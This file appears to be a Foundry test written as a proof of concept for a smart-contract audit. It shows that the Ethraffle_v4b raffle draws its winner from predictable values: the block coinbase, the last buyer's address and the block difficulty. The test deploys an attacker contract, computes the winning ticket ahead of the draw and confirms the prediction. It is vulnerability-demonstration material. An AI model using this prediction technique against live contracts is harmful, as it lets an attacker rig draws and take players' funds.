
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Ethraffle_v4b} from "../src/Ethraffle_v4b.sol";

contract AttackerContract {
    Ethraffle_v4b public raffle;
    
    constructor(Ethraffle_v4b _raffle) {
        raffle = _raffle;
    }
    
    function buyTicketsForAttacker() external payable {
        raffle.buyTickets{value: msg.value}();
    }
    
    receive() external payable {}
}

contract TestWeakRandomnessEthraffle_v4b is Test {
    Ethraffle_v4b public raffle;
    
    uint256 public constant PRIZE = 2.5 ether;
    uint256 public constant FEE = 0.03 ether;
    uint256 public constant TOTAL_TICKETS = 50;
    uint256 public constant PRICE_PER_TICKET = (PRIZE + FEE) / TOTAL_TICKETS;
    
    event RaffleResult(
        uint raffleId,
        uint winningNumber,
        address winningAddress,
        address seed1,
        address seed2,
        uint seed3,
        bytes32 randHash
    );

    function setUp() public {
        raffle = new Ethraffle_v4b();
    }

    function test_highlightPredictableRandomValue(
        address blockCoinbase,
        uint256 blockDifficulty
    ) public {
        // --- 1. Constraints ---
        vm.assume(blockCoinbase != address(0));
        vm.assume(blockDifficulty > 0 && blockDifficulty < type(uint128).max);
        
        // --- 2. State Configuration ---
        
        // Fund the test contract to buy tickets
        vm.deal(address(this), 100 ether);
        
        // Create an attacker contract that will be the last buyer (msg.sender for chooseWinner)
        AttackerContract attacker = new AttackerContract(raffle);
        vm.deal(address(attacker), 10 ether);
        
        // Manipulate block environment
        vm.coinbase(blockCoinbase);
        vm.difficulty(blockDifficulty);
        
        // Buy 49 tickets from this contract first
        for (uint256 i = 0; i < 49; i++) {
            raffle.buyTickets{value: PRICE_PER_TICKET}();
        }
        
        // --- 3. Replication & Assertion ---
        
        // Before the last ticket purchase, predict the winner
        // The attacker (last buyer) will trigger chooseWinner
        
        // Build the contestant mapping as it will be after all purchases
        // Tickets 0-48 belong to address(this)
        // Ticket 49 will belong to attacker
        
        address[] memory contestantAddrs = new address[](TOTAL_TICKETS);
        for (uint256 i = 0; i < 49; i++) {
            contestantAddrs[i] = address(this);
        }
        contestantAddrs[49] = address(attacker);
        
        // Predict seed1: contestants[uint(uint160(block.coinbase)) % totalTickets].addr
        uint256 seed1Index = uint256(uint160(blockCoinbase)) % TOTAL_TICKETS;
        address predictedSeed1 = contestantAddrs[seed1Index];
        
        // Predict seed2: contestants[uint(uint160(msg.sender)) % totalTickets].addr
        // msg.sender will be the attacker contract
        uint256 seed2Index = uint256(uint160(address(attacker))) % TOTAL_TICKETS;
        address predictedSeed2 = contestantAddrs[seed2Index];
        
        // Predict seed3: block.difficulty
        uint256 predictedSeed3 = blockDifficulty;
        
        // Predict randHash
        bytes32 predictedRandHash = keccak256(abi.encodePacked(predictedSeed1, predictedSeed2, predictedSeed3));
        
        // Predict winning number
        uint256 predictedWinningNumber = uint256(predictedRandHash) % TOTAL_TICKETS;
        
        // Predict winning address
        address predictedWinningAddress = contestantAddrs[predictedWinningNumber];
        
        // Record the winner's balance before
        uint256 winnerBalanceBefore = predictedWinningAddress.balance;
        
        // Execute: Have the attacker buy the last ticket, triggering chooseWinner
        vm.expectEmit(true, true, true, true);
        emit RaffleResult(
            1,
            predictedWinningNumber,
            predictedWinningAddress,
            predictedSeed1,
            predictedSeed2,
            predictedSeed3,
            predictedRandHash
        );
        
        attacker.buyTicketsForAttacker{value: PRICE_PER_TICKET}();
        
        // Assert predictability: The winner received the prize as we predicted
        uint256 winnerBalanceAfter = predictedWinningAddress.balance;
        
        // If the predicted winner is the attacker, they also get refund of excess payment
        if (predictedWinningAddress == address(attacker)) {
            assertGe(winnerBalanceAfter, winnerBalanceBefore + PRIZE, "Winner should have received the prize");
        } else {
            assertEq(winnerBalanceAfter, winnerBalanceBefore + PRIZE, "Winner should have received exactly the prize");
        }
        
        // Verify raffle moved to next round
        assertEq(raffle.raffleId(), 2, "Raffle should have moved to round 2");
    }
    
    receive() external payable {}
}
